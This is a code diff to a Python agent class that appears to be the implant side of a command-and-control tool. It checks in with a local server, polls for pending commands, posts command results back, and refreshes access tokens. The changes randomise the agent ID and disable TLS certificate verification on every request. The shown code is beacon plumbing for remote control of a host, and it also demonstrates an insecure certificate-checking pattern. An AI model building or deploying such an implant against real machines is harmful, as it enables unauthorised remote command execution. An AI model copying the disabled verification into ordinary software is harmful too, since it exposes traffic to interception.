@@ -3,11 +3,16 @@ import json
 from time import sleep
 import subprocess
 import sys
+import random
+import sys
 
 class Agent(object):
 
-	url = "http://127.0.0.1:9000/"
-	payload = "{\n\t\"agent_id\": 123,\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}"
+	url = "https://127.0.0.1:9000/"
+	random_num = random.randint(100,90000)
+	#payload = "{\"agent_id\": \"{}\",\n\t\"os\": \"Windows\",\n\t\"ip\": \"0.0.0.0\",\n\t\"user\": \"guest\",\n\t\"completed_commands\": [],\n\t\"pending_commands\": []\n}".format(random_num)
+	payload = {"agent_id":"{}".format(random_num),"os":"Windows","ip":"0.0.0.0","user":"guest","completed_commands":[],"pending_commands":[]}
+	payload = json.dumps(payload)
 	headers = {
 	  'User-Agent': 'QmxhY2tUYWJieQo=',
 	  'Content-Type': 'application/json',
@@ -21,7 +26,7 @@ class Agent(object):
 
 	def first_checkin(self):
 		url = self.url + 'first_check_in'
-		self.response = requests.request("POST",url,headers=self.headers,data = self.payload)
+		self.response = requests.request("POST",url,headers=self.headers,data = self.payload,verify=False)
 		self.response_json = self.response.json()
 		self.doc_id = self.response_json['id']
 		self.rev_num = self.response_json['rev']
@@ -33,7 +38,7 @@ class Agent(object):
 	def check(self):
 		url = self.url + "poll"
 		headers = {"doc_id":self.doc_id,"Authorization":"Bearer {}".format(self.access_token)}
-		response = requests.request("GET",url,headers=headers)
+		response = requests.request("GET",url,headers=headers,verify=False)
 		response_json = dict(response.json())
 		print(response_json)
 		self.updated_payload = response_json
@@ -46,7 +51,7 @@ class Agent(object):
 				try:
 					### Requesting new token ###
 					refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
-					resp = requests.request("GET",self.url + "refresh",headers=refresh_header)
+					resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
 					resp = resp.json()
 					self.access_token = resp['token'] ## new token
 					return True
@@ -60,7 +65,7 @@ class Agent(object):
 			print("no command")
 			### Requesting new token ###
 			refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
-			resp = requests.request("GET",self.url + "refresh",headers=refresh_header)
+			resp = requests.request("GET",self.url + "refresh",headers=refresh_header,verify=False)
 			resp = resp.json()
 			self.access_token = resp['token'] ## new token
 			return False
@@ -72,7 +77,7 @@ class Agent(object):
 		self.updated_payload['completed_commands'].append(self.cmd_result)
 		print(self.updated_payload)
 		headers = {"Content-Type":"application/json","doc_id":self.doc_id, "Authorization":"Bearer {}".format(self.access_token)}
-		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload))
+		response = requests.request("POST",url,headers=headers,data=json.dumps(self.updated_payload),verify=False,)
 		print(response.text)
 		print("completed post to database")
 
@@ -80,7 +85,7 @@ class Agent(object):
 	def refresh_token(self):
 		refresh_header = {"Authorization":"Bearer {}".format(self.refresh_token)}
 		refresh_url = self.url + "refresh"
-		resp = requests.request("GET",refresh_url,headers=refresh_header)
+		resp = requests.request("GET",refresh_url,headers=refresh_header,verify=False,)
 		resp_json = resp.json()
 		print(resp_json['token'])
 		return resp_json['token']
